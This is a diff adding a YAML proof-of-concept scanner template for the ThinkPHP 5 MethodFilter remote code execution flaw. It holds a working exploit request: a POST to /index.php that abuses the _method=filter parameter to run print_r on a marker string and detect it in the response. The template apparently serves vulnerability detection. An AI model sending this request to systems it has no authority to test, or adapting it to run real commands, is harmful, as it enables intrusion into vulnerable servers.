@@ -1,0 +1,20 @@
+id: poc-yaml-thinkphp-method-filter-code-exec
+info:
+  name: ThinkPHP 5 MethodFilter 远程代码执行漏洞
+  severity: high
+  tags:
+  - rce
+  - 两高一弱
+  finger: ThinkPHP
+  osprey-id: vb_2019_0073
+requests:
+- method: POST
+  path: /index.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: c=print_r&f=4e5e5d7364f443e28fbf0d3ae744a59a&_method=filter
+  expression: 'contains(body, "print_r4e5e5d7364f443e28fbf0d3ae744a59afilterprint_r4e5e5d7364f443e28fbf0d3ae744a59afilter")
+
+    '
+variables: {}
+transport: http
